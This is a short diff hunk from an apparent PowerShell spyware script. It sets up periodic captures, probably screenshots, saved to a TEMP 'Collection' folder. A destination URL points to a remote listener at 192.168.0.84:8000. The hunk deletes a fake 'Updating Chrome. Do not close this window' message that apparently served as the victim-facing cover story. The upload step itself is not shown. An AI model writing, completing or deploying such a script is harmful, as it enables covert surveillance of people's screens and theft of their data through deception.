@@ -8,7 +8,6 @@ $interval = 3    # Intervalo entre capturas en segundos
 $numberOfCaptures = $totalTime / $interval
 
 $destinationUrl = "http://192.168.0.84:8000/"
-Write-Host "Updating Chrome. Do not close this window"
 $outputDir = "$env:TEMP\Collection\"
 if (-not (Test-Path $outputDir)) {
     New-Item -ItemType Directory -Path $outputDir
